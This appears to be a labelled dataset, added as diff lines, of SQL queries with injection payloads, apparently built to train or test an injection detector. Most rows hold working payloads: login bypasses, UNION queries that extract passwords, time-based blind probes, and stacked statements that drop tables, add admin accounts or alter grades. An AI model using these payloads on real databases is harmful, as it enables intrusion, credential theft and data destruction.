+SELECT * from table where username = ' a' or 'a' = 'a' and password = '',1,0,0
+"SELECT * from username where type = ''or 1=1; SET IDENTITY_INSERT Students ON INSERT INTO Students (StudentID, Username, Password) VALUES (attacker studentid, 'attacker username','attacker password');--'",1,1,0
+SELECT email from users where email = ' 1' AND non_existant_table = '1 ',0,0,0
+SELECT * FROM users WHERE username = ' 'sqlvuln',1,0,0
+"SELECT * from test.members where user_name=''union select 1,2,3,x,x,x,x,@@version,x--' and password='';",1,1,1
+SELECT data FROM table WHERE Emailinput = ' 1' AND non_existant_table = '1 ',0,0,0
+"SELECT * FROM customers WHERE username = ''ddd""""' and password = ''",1,0,0
+"SELECT * FROM newsletter WHERE email = 'IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1))/*'XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR'|""XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),โ€SLEEP(1)))OR""*/'",1,0,0
+SELECT * from username where type = '' union select password from users --',1,0,1
+"SELECT * FROM some_table WHERE double_quotes = ''ddd""""'",1,0,0
+"SELECT * FROM newsletter WHERE email = 'IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1))/*'XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR'|""XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR""*/'",1,0,0
+SELECT * FROM product WHERE PCategory=' a' or 1=1--',1,0,0
+SELECT email from users where email = '' and 1 = any (select 1 from users where FULL_NAME like โ€%%dministratorโ€ and rownum<=1 and PASSWORD like โ€0%โ€) and โ€1%%โ€=โ€1',1,0,0
+SELECT id FROM Users WHERE username = 'ddd' group by (password)--',1,0,0
+SELECT * FROM some_table WHERE double_quotes = ' ' 1 OR 1=1-- ',1,0,0
+"SELECT * FROM 'news' WHERE 'id' = 'ddd' group by (password)--' ORDER BY 'id' DESC LIMIT 0,3",1,0,0
+SELECT * FROM some_table WHERE double_quotes = '' union select password from users where name = 'Robin' --',1,0,1
+"SELECT user_name,password from test.members where user_name= ''; INSERT into Username (username, password, user_type) value('admin2', 'admin2', '1'); --'",1,1,0
+SELECT * FROM product WHERE PCategory=' 1 AND USER_NAME() = \'dbo\'-- ',1,0,0
+SELECT * FROM profiles WHERE ID = ' 1' AND non_existant_table = '1 ',0,0,0
+SELECT * from username where type = ' ' or 0=0 #',1,0,0
+"SELECT * FROM newsletter WHERE email = '' AND 1=0 UNION SELECT '1', 'a', 'Robin', 'b' --'",1,0,1
+SELECT * FROM profiles WHERE ID = ' ' or a=a--',1,0,0
+"SELECT * FROM 'news' WHERE 'id' = ''; DROP table Username --' ORDER BY 'id' DESC LIMIT 0,3",1,1,0
+SELECT * from user where id =''',1,0,0
+"SELECT user_name,password from test.members where user_name= ' ' or 0=0 #'",1,0,0
+"SELECT user_name,password from test.members where user_name= ' ' 1 OR 1=1-- '",1,0,0
+"SELECT user_name,password from test.members where user_name= ' ' OR username IS NOT NULL OR username = ' '",1,0,0
+SELECT id FROM Users WHERE username = '' union select password from users --',1,0,1
+SELECT * FROM custTable WHERE User=' ' or 'a'='a' OR 1=1'-- AND Pass=?,1,0,0
+"SELECT data FROM table WHERE Emailinput = '' AND 1=0 UNION SELECT '1', 'a', 'Robin', 'b' --'",1,0,1
+SELECT data FROM table WHERE Emailinput = ''or 1=1; UPDATE Grades SET grade='attacker grade' WHERE studentId=attacker studentid;--',1,1,0
+"SELECT user_name,password from test.members where user_name= ' ' or 'x'='x'",1,0,0
+SELECT id FROM Users WHERE username = ' a' waitfor delay '0:0:10'--',1,0,0
+SELECT * FROM users WHERE name=' 1 AND USER_NAME() = \'dbo\'-- ' and password='',1,0,0
+SELECT * FROM product WHERE PCategory=' ' OR 1=1-- ',1,0,0
+"SELECT * from test.members where user_name=''ddd""""'",1,0,0
+SELECT * from test.members where user_name=''; DROP table Username --' and password='';,1,1,0
+SELECT data FROM table WHERE Emailinput = ' '' ',1,0,0
+"SELECT * FROM 'news' WHERE 'id' = ' ' or 1 UNION SELECT ALL FROM WHERE--' ORDER BY 'id' DESC LIMIT 0,3",1,0,1
+SELECT * from test.members where user_name=' 1' AND 1=(SELECT COUNT(*) FROM tablenames); -- ' and password='';,1,1,0
+"SELECT * FROM product WHERE PCategory='IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1))/*'XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR'|""XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR""*/'",1,0,0
+SELECT * from username where type = ' ' OR username IS NOT NULL OR username = ' ',1,0,0
+SELECT * from table where username = ' ' or 1=1--' and password = '',1,0,0
+SELECT * FROM product WHERE PCategory=' 1' AND non_existant_table = '1 ',0,0,0
+"SELECT 1,2, '; TRUNCATE TABLE Username; -- FROM some_table WHERE ex = ample",1,1,0
+SELECT * from test.members where user_name=' ' OR username IS NOT NULL OR username = ' ' and password='';,1,1,0
+"SELECT * FROM 'news' WHERE 'id' = ' '; UPDATE table SET email = 'hacker@ymail.com' WHERE email = 'joe@ymail.com-- ' ORDER BY 'id' DESC LIMIT 0,3",1,1,0
+"SELECT * FROM 'news' WHERE 'id' = ' 'sqlvuln' ORDER BY 'id' DESC LIMIT 0,3",1,0,0
+"SELECT * FROM profiles WHERE ID = ''ddd""""'",1,0,0
+"SELECT * from table where username = ''union select all 1,2,x,x,x,x --' and password = ''",1,0,1
+SELECT * FROM product WHERE PCategory=''or 1=1; UPDATE Grades SET grade='attacker grade' WHERE studentId=attacker studentid;--',1,1,0
+"SELECT 1,2, ' or 1 UNION SELECT ALL FROM WHERE-- FROM some_table WHERE ex = ample",1,0,1
+SELECT * FROM newsletter WHERE email = '' and 1 = any (select 1 from users where FULL_NAME like โ€%%dministratorโ€ and rownum<=1 and PASSWORD like โ€0%โ€) and โ€1%%โ€=โ€1',1,0,0
+SELECT id FROM Users WHERE username = ' '' ',1,0,0
+SELECT * FROM students WHERE username = ' \\'; DESC users; -- ' AND password = '',1,1,0
+SELECT * FROM students WHERE username = ' ' or 0=0 --' AND password = '',1,0,0
+SELECT * FROM customers WHERE username = ' ' or 'x'='x' and password = '',1,0,0
+"SELECT 1,2, "" FROM some_table WHERE ex = ample",1,0,0
+"SELECT 1,2, \\'; DESC users; -- FROM some_table WHERE ex = ample",1,1,0
+SELECT * FROM profiles WHERE ID = ' admin'-- ',1,0,0
+"SELECT 1,2, ' or 1=1-- FROM some_table WHERE ex = ample",1,0,0
+SELECT * FROM customers WHERE username = ' ' 1 OR 1=1-- ' and password = '',1,0,0
+"SELECT 1,2, ' or (1 AND ASCII(LOWER(SUBSTRING((SELECT TOP 1 name FROM sysobjects WHERE xtype=\'U\'), 1, 1))) > 116)-- FROM some_table WHERE ex = ample",1,0,0
+SELECT * from user where id =' a' waitfor delay '0:0:10'--',1,0,0
+SELECT * FROM some_table WHERE double_quotes = ' ' 1 AND 1=1-- ',1,0,0
+SELECT * FROM users WHERE username = ' ' or a=a--',1,0,0
+"SELECT data FROM table WHERE Emailinput = '""""'",1,0,0
+SELECT * FROM product WHERE PCategory=' a' waitfor delay '0:0:10'--',1,0,0
+SELECT email from users where email = ''; DROP table Username --',1,1,0
+SELECT email from users where email = ' ' or a=a--',1,0,0
+"SELECT * from table where username = 'IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1))/*'XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR'|""XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),โ€SLEEP(1)))OR""*/' and password = ''",1,0,0
+SELECT * from test.members where user_name=''or 1=1; UPDATE Grades SET grade='attacker grade' WHERE studentId=attacker studentid;--' and password='';,1,1,0
+"SELECT * FROM custTable WHERE User=''union select 1,2,3,x,x,x,x,@@version,x--' OR 1=1'-- AND Pass=?",1,0,1
+"SELECT * FROM product WHERE PCategory='' AND 1=0 UNION SELECT '1', 'a', 'Robin', 'b' --'",1,0,1
+SELECT data FROM table WHERE Emailinput = ' ' or 0=0 #',1,0,0
+"SELECT user_name,password from test.members where user_name= 'ddd' group by (password)--'",1,0,0
+SELECT * from table where username = ' a' or 1=1--' and password = '',1,0,0
+"SELECT user_name,password from test.members where user_name= ''or 1=1; DELETE FROM Grades WHERE course='attacker class' AND studentId=attacker studentid;--'",1,1,0
+SELECT * from table where username = ' ' OR 1=1-- ' and password = '',1,0,0
+SELECT * from username where type = ' a' or 1=1--',1,0,0
+SELECT * from table where username = '' and 1 = any (select 1 from users where FULL_NAME like โ€%%dministratorโ€ and rownum<=1 and PASSWORD like โ€0%โ€) and โ€1%%โ€=โ€1' and password = '',1,0,0
+"SELECT * FROM students WHERE username = '""""' AND password = ''",1,0,0
+SELECT * from test.members where user_name=''or 1=1; DELETE FROM Grades WHERE course='attacker class' AND studentId=attacker studentid;--',1,1,0
+"SELECT 1,2, 'ddd"" FROM some_table WHERE ex = ample",1,0,0
+"SELECT * FROM newsletter WHERE email = 'ddd' union select username,password from students --'",1,0,1
+SELECT * FROM custTable WHERE User=' 1' AND non_existant_table = '1 ' OR 1=1'-- AND Pass=?,1,0,0
+SELECT * FROM users WHERE username = ' ' or 'a'='a',1,0,0
+"SELECT 1,2, ' 1 OR 1=1-- FROM some_table WHERE ex = ample",1,0,0
+SELECT * from username where type = ' ' 1 OR 1=1-- ',1,0,0
+"SELECT * from user where id =' ' or (1 UNION ALL SELECT 1,2,3,4,5,6,name FROM sysObjects WHERE xtype = \'U\') -- '",1,0,1
+SELECT * FROM some_table WHERE double_quotes = ' '; UPDATE table SET email = 'hacker@ymail.com' WHERE email = 'joe@ymail.com-- ',1,1,0
+SELECT * from table where username = ' ' or 'x'='x' and password = '',1,0,0
+SELECT email from users where email = ' ' 1 OR 1=1-- ',1,0,0
+SELECT * from test.members where user_name=' ' or 'x'='x' and password='';,1,1,0
+"SELECT * FROM some_table WHERE double_quotes = '""""'",1,0,0
+SELECT id FROM Users WHERE username = ' ' or 1 EXEC XP_ ',1,0,0
+"SELECT user_name,password from test.members where user_name= ' ' or 'a'='a'",1,0,0
+SELECT * FROM users WHERE username = ''; DROP table Username --',1,1,0
+SELECT * FROM custTable WHERE User=' \\'; DESC users; -- ' OR 1=1'-- AND Pass=?,1,1,0
+"SELECT 1,2, '%31%27%20%4F%52%20%27%31%27%3D%27%31 FROM some_table WHERE ex = ample",0,0,0
+SELECT * FROM custTable WHERE User='ddd' compute sum(username)--' OR 1=1'-- AND Pass=?,1,0,0
+"SELECT * FROM some_table WHERE double_quotes = ''union select 1,2,3,x,x,x,x,@@version,x--'",1,0,1
+SELECT * FROM some_table WHERE double_quotes = ' hi' or 1=1 --',1,0,0
+SELECT * FROM profiles WHERE ID = ' 1' AND 1=(SELECT COUNT(*) FROM tablenames); -- ',1,1,0
+SELECT data FROM table WHERE Emailinput = ' '%31%27%20%4F%52%20%27%31%27%3D%27%31',1,0,0
+SELECT * FROM custTable WHERE User=' ' or 1 UNION SELECT ALL FROM WHERE--' OR 1=1'-- AND Pass=?,1,0,1
+"SELECT * FROM users WHERE username = 'IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1))/*'XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR'|""XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),โ€SLEEP(1)))OR""*/'",1,0,0
+"SELECT * from test.members where user_name='IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1))/*'XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR'|""XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR""*/'",1,0,0
+SELECT * from username where type = ' a' waitfor delay '0:0:10'--',1,0,0
+"SELECT user_name,password from test.members where user_name= 'ddd' union select username from students --'",1,0,1
+SELECT * FROM newsletter WHERE email = ' hi' or 1=1 --',1,0,0
+"SELECT * FROM customers WHERE username = ''union select all 1,2,x,x,x,x --' and password = ''",1,0,1
+"SELECT * FROM product WHERE PCategory=''; INSERT into Username (username, password, user_type) value('admin2', 'admin2', '1'); --'",1,1,0
+"SELECT data FROM table WHERE Emailinput = ' ' or (1 AND ASCII(LOWER(SUBSTRING((SELECT TOP 1 name FROM sysobjects WHERE xtype=\'U\'), 1, 1))) > 116)-- '",1,0,0
+"SELECT user_name,password from test.members where user_name= ' ' or (1 UNION ALL SELECT 1,2,3,4,5,6,name FROM sysObjects WHERE xtype = \'U\') -- '",1,0,1
+SELECT data FROM table WHERE Emailinput = ''or 1=1; DELETE FROM Grades WHERE course='attacker class' AND studentId=attacker studentid;--',1,1,0
+"SELECT * from table where username = ' ' or (1 UNION ALL SELECT 1,2,3,4,5,6,name FROM sysObjects WHERE xtype = \'U\') -- ' and password = ''",1,0,1
+SELECT * FROM customers WHERE username = ' '; UPDATE table SET email = 'hacker@ymail.com' WHERE email = 'joe@ymail.com-- ' and password = '',1,1,0
+SELECT * FROM product WHERE PCategory=' 'sqlvuln',1,0,0
+SELECT * from test.members where user_name=' 1' AND 1=(SELECT COUNT(*) FROM tablenames); -- ',1,1,0
+"SELECT user_name,password from test.members where user_name= ' 1 AND USER_NAME() = \'dbo\'-- '",1,0,0
+SELECT * FROM newsletter WHERE email = ' 1 AND USER_NAME() = \'dbo\'-- ',1,0,0
+"SELECT * FROM product WHERE PCategory=' ' or (1 AND ASCII(LOWER(SUBSTRING((SELECT TOP 1 name FROM sysobjects WHERE xtype=\'U\'), 1, 1))) > 116)-- '",1,0,0
+SELECT * from table where username = ' 1 AND USER_NAME() = \'dbo\'-- ' and password = '',1,0,0
+SELECT id FROM Users WHERE username = '' union select password from users where name = 'Robin' --',1,0,1
+"SELECT data FROM table WHERE Emailinput = ' ' or (1 UNION ALL SELECT 1,2,3,4,5,6,name FROM sysObjects WHERE xtype = \'U\') -- '",1,0,1
+"SELECT * FROM 'news' WHERE 'id' = ' ' 1 AND 1=1-- ' ORDER BY 'id' DESC LIMIT 0,3",1,0,0
+SELECT * FROM users WHERE username = ' 1' AND 1=(SELECT COUNT(*) FROM tablenames); -- ',1,1,0
+SELECT data FROM table WHERE Emailinput = ' ' or 1=1--',1,0,0
+"SELECT * FROM 'news' WHERE 'id' = 'ddd' union select username,password from students --' ORDER BY 'id' DESC LIMIT 0,3",1,0,1
+SELECT * FROM newsletter WHERE email = ' '%31%27%20%4F%52%20%27%31%27%3D%27%31',1,0,0
+SELECT * from username where type = ' 1\\'1-- ',1,0,0
+SELECT * FROM users WHERE username = ' admin'-- ',1,0,0
+SELECT id FROM Users WHERE username = ' ' or a=a--',1,0,0
+SELECT * from test.members where user_name=' a' or 1=1--',1,0,0
+"SELECT * FROM 'news' WHERE 'id' = ' ' OR username IS NOT NULL OR username = ' ' ORDER BY 'id' DESC LIMIT 0,3",1,0,0
+SELECT * from test.members where user_name='' union select password from users --',1,0,1
+SELECT * from table where username = '' union select password from users where name = 'Robin' --' and password = '',1,0,1
+SELECT * FROM users WHERE username = ' ' or 1=1--',1,0,0
+SELECT email from users where email = ' 1 AND USER_NAME() = \'dbo\'-- ',1,0,0
+SELECT * from username where type = 'ddd' compute sum(username)--',1,0,0
+"SELECT * FROM students WHERE username = ''ddd""""' AND password = ''",1,0,0
+SELECT email from users where email = 'ddd' group by (password)--',1,0,0
+SELECT * FROM students WHERE username = ' ' or 0=0 #' AND password = '',1,0,0
+SELECT * from test.members where user_name='' and 1 = any (select 1 from users where FULL_NAME like โ€%%dministratorโ€ and rownum<=1 and PASSWORD like โ€0%โ€) and โ€1%%โ€=โ€1',1,0,0
+"SELECT * from user where id ='IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1))/*'XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR'|""XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),โ€SLEEP(1)))OR""*/'",1,0,0
+SELECT data FROM table WHERE Emailinput = ' ' or 1 EXEC XP_ ',1,0,0
+"SELECT * from username where type = 'IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1))/*'XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR'|""XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR""*/'",1,0,0
+SELECT * from user where id =' ' or 1=1--',1,0,0
+SELECT * from user where id ='' and 1 = any (select 1 from users where FULL_NAME like โ€%%dministratorโ€ and rownum<=1 and PASSWORD like โ€0%โ€) and โ€1%%โ€=โ€1',1,0,0
+SELECT * FROM users WHERE username = ''or 1=1; DELETE FROM Grades WHERE course='attacker class' AND studentId=attacker studentid;--',1,1,0
+"SELECT * FROM students WHERE username = '' AND 1=0 UNION SELECT '1', 'a', 'Robin', 'b' --' AND password = ''",1,0,1
+"SELECT user_name,password from test.members where user_name= '''",1,0,0
+SELECT data FROM table WHERE Emailinput = '' union select password from users where name = 'Robin' --',1,0,1
+SELECT * from username where type = ' 'sqlvuln',1,0,0
+SELECT * FROM students WHERE username = ' ' or 1 UNION SELECT ALL FROM WHERE--' AND password = '',1,0,1
+"SELECT * FROM profiles WHERE ID = 'IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1))/*'XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR'|""XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR""*/'",1,0,0
+"SELECT data FROM table WHERE Emailinput = 'ddd' union select username,password from students --'",1,0,1
+"SELECT * from table where username = '""""' and password = ''",1,0,0
+SELECT * FROM customers WHERE username = ' ' or 1 EXEC XP_ ' and password = '',1,0,0
+SELECT * FROM users WHERE name=''' and password='',1,0,0
+"SELECT * FROM profiles WHERE ID = ''or 1=1; SET IDENTITY_INSERT Students ON INSERT INTO Students (StudentID, Username, Password) VALUES (attacker studentid, 'attacker username','attacker password');--'",1,1,0
+"SELECT * FROM customers WHERE username = ''or 1=1; SET IDENTITY_INSERT Students ON INSERT INTO Students (StudentID, Username, Password) VALUES (attacker studentid, 'attacker username','attacker password');--' and password = ''",1,1,0
+"SELECT 1,2, 'union select all 1,2,x,x,x,x -- FROM some_table WHERE ex = ample",1,0,1
+SELECT * FROM users WHERE username = ' 1' AND non_existant_table = '1 ',0,0,0
+"SELECT * from table where username = '' AND 1=0 UNION SELECT '1', 'a', 'Robin', 'b' --' and password = ''",1,0,1
+"SELECT * from table where username = 'ddd' union select username,password from students --' and password = ''",1,0,1
+SELECT * from username where type = ' ' 1 AND 1=1-- ',1,0,0
+SELECT * from test.members where user_name=' 'sqlvuln',1,0,0
+SELECT * FROM users WHERE name=' ' 1 AND 1=1-- ' and password='',1,0,0
+SELECT * FROM profiles WHERE ID = ' 1\\'1-- ',1,0,0
+"SELECT * from test.members where user_name=' ' or (1 UNION ALL SELECT 1,2,3,4,5,6,name FROM sysObjects WHERE xtype = \'U\') -- ' and password='';",1,1,1
+"SELECT 1,2, ' and 1 = any (select 1 from users where FULL_NAME like โ€%%dministratorโ€ and rownum<=1 and PASSWORD like โ€0%โ€) and โ€1%%โ€=โ€1 FROM some_table WHERE ex = ample",0,0,0
+"SELECT * from user where id =' ' or (1 AND ASCII(LOWER(SUBSTRING((SELECT TOP 1 name FROM sysobjects WHERE xtype=\'U\'), 1, 1))) > 116)-- '",1,0,0
+SELECT data FROM table WHERE Emailinput = ' hi' or 1=1 --',1,0,0
+"SELECT 1,2, a' or 1=1-- FROM some_table WHERE ex = ample",1,0,0
+SELECT data FROM table WHERE Emailinput = '' and 1 = any (select 1 from users where FULL_NAME like โ€%%dministratorโ€ and rownum<=1 and PASSWORD like โ€0%โ€) and โ€1%%โ€=โ€1',1,0,0
+SELECT * FROM users WHERE username = ''',1,0,0
+SELECT email from users where email = ' ' or 0=0 --',1,0,0
+SELECT data FROM table WHERE Emailinput = ' '; UPDATE table SET email = 'hacker@ymail.com' WHERE email = 'joe@ymail.com-- ',1,1,0
+SELECT * FROM profiles WHERE ID = ' ' or 1 UNION SELECT ALL FROM WHERE--',1,0,1
+"SELECT id FROM Users WHERE username = 'IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1))/*'XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR'|""XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR""*/'",1,0,0
+"SELECT 1,2, hi' or 1=1 -- FROM some_table WHERE ex = ample",1,0,0
+SELECT data FROM table WHERE Emailinput = ' ' or 'a'='a',1,0,0
+"SELECT * FROM 'news' WHERE 'id' = ' '' ' ORDER BY 'id' DESC LIMIT 0,3",1,0,0
+"SELECT * from test.members where user_name=''; INSERT into Username (username, password, user_type) value('admin2', 'admin2', '1'); --'",1,1,0
+SELECT * from test.members where user_name=' hi' or 1=1 --' and password='';,1,1,0
+"SELECT 1,2, ddd' group by (studentid)-- FROM some_table WHERE ex = ample",1,0,0
+SELECT data FROM table WHERE Emailinput = ' ' or 0=0 --',1,0,0
+SELECT * FROM product WHERE PCategory=' 1' AND 1=(SELECT COUNT(*) FROM tablenames); -- ',1,1,0
+SELECT * FROM users WHERE name=' \\'; DESC users; -- ' and password='',1,1,0
+SELECT * FROM custTable WHERE User=' hi' or 1=1 --' OR 1=1'-- AND Pass=?,1,0,0
+SELECT * from username where type = ' ' or 1 EXEC XP_ ',1,0,0
+"SELECT * FROM newsletter WHERE email = ''union select 1,2,3,x,x,x,x,@@version,x--'",1,0,1
+"SELECT 1,2, 'or 1=1; UPDATE Grades SET grade='attacker grade' WHERE studentId=attacker studentid;-- FROM some_table WHERE ex = ample",1,1,0
+"SELECT id FROM Users WHERE username = ''union select 1,2,3,x,x,x,x,@@version,x--'",1,0,1
+SELECT * from test.members where user_name=' ' or 'a'='a' and password='';,1,1,0
+"SELECT * from test.members where user_name='IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1))/*'XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR'|""XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),โ€SLEEP(1)))OR""*/'",1,0,0
+SELECT * FROM students WHERE username = ' ' 1 AND 1=1-- ' AND password = '',1,0,0
+SELECT * FROM profiles WHERE ID = ' a' or 1=1--',1,0,0
+"SELECT id FROM Users WHERE username = ''ddd""""'",1,0,0
+"SELECT email from users where email = 'IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1))/*'XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR'|""XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),โ€SLEEP(1)))OR""*/'",1,0,0
+SELECT * from test.members where user_name=' ' or 0=0 --',1,0,0
+SELECT * FROM profiles WHERE ID = ' ' or 0=0 #',1,0,0
+SELECT * FROM profiles WHERE ID = ' 'sqlvuln',1,0,0
+SELECT * from table where username = 'ddd' union select username from students --' and password = '',1,0,1
+SELECT * FROM users WHERE name='ddd' union select username from students --' and password='',1,0,1
+SELECT * FROM students WHERE username = ' ' 1 OR 1=1-- ' AND password = '',1,0,0
+"SELECT * FROM product WHERE PCategory=''ddd""""'",1,0,0
+SELECT * from table where username = ' ' or 0=0 --' and password = '',1,0,0
+SELECT * from test.members where user_name=' ' or 1 EXEC XP_ ' and password='';,1,1,0
+SELECT data FROM table WHERE Emailinput = ' 1\\'1-- ',1,0,0
+SELECT * from test.members where user_name=' ' OR 1=1-- ',1,0,0
+SELECT * from test.members where user_name=' hi' or 1=1 --',1,0,0
+"SELECT email from users where email = '""""'",1,0,0
+SELECT * from test.members where user_name=' 'sqlvuln' and password='';,1,1,0
+SELECT * from username where type = ' admin'-- ',1,0,0
+SELECT * FROM custTable WHERE User='' union select password from users where name = 'Robin' --' OR 1=1'-- AND Pass=?,1,0,1
+"SELECT * FROM users WHERE name='' AND 1=0 UNION SELECT '1', 'a', 'Robin', 'b' --' and password=''",1,0,1
+SELECT * from user where id =' 1\\'1-- ',1,0,0
+SELECT id FROM Users WHERE username = ' ' or 1=1--',1,0,0
+SELECT * FROM some_table WHERE double_quotes = ' ' or 1 EXEC XP_ ',1,0,0
+SELECT * from username where type = ' '' ',1,0,0
+"SELECT * FROM users WHERE name=' ' or (1 AND ASCII(LOWER(SUBSTRING((SELECT TOP 1 name FROM sysobjects WHERE xtype=\'U\'), 1, 1))) > 116)-- ' and password=''",1,0,0
+"SELECT * FROM custTable WHERE User=''union select all 1,2,x,x,x,x --' OR 1=1'-- AND Pass=?",1,0,1
+SELECT * FROM students WHERE username = ' 1\\'1-- ' AND password = '',1,0,0
+"SELECT 1,2, 'union select 1,2,3,x,x,x,x,@@version,x-- FROM some_table WHERE ex = ample",1,0,1
+SELECT * FROM profiles WHERE ID = ' \\'; DESC users; -- ',1,1,0
+SELECT id FROM Users WHERE username = ''; TRUNCATE TABLE Username; --',1,1,0
+"SELECT user_name,password from test.members where user_name= '' union select password from users --'",1,0,1
+SELECT * FROM customers WHERE username = ' ' 1 AND 1=1-- ' and password = '',1,0,0
+SELECT * from test.members where user_name='' and 1 = any (select 1 from users where FULL_NAME like โ€%%dministratorโ€ and rownum<=1 and PASSWORD like โ€0%โ€) and โ€1%%โ€=โ€1' and password='';,1,1,0
+"SELECT * from username where type = '""""'",1,0,0
+"SELECT * FROM customers WHERE username = ' ' or (1 UNION ALL SELECT 1,2,3,4,5,6,name FROM sysObjects WHERE xtype = \'U\') -- ' and password = ''",1,0,1
+SELECT data FROM table WHERE Emailinput = ''; DROP table Username --',1,1,0
+SELECT * FROM product WHERE PCategory='' union select password from users where name = 'Robin' --',1,0,1
+SELECT * FROM custTable WHERE User='ddd' union select username from students --' OR 1=1'-- AND Pass=?,1,0,1
+SELECT * from test.members where user_name=' 1\\'1-- ',1,0,0
+"SELECT user_name,password from test.members where user_name= 'IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1))/*'XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR'|""XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),โ€SLEEP(1)))OR""*/'",1,0,0
+"SELECT * FROM profiles WHERE ID = '' AND 1=0 UNION SELECT '1', 'a', 'Robin', 'b' --'",1,0,1
+"SELECT email from users where email = ' ' or (1 UNION ALL SELECT 1,2,3,4,5,6,name FROM sysObjects WHERE xtype = \'U\') -- '",1,0,1
+SELECT * FROM newsletter WHERE email = ' ' or 1 EXEC XP_ ',1,0,0
+"SELECT * FROM 'news' WHERE 'id' = 'IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1))/*'XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR'|""XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR""*/' ORDER BY 'id' DESC LIMIT 0,3",1,0,0
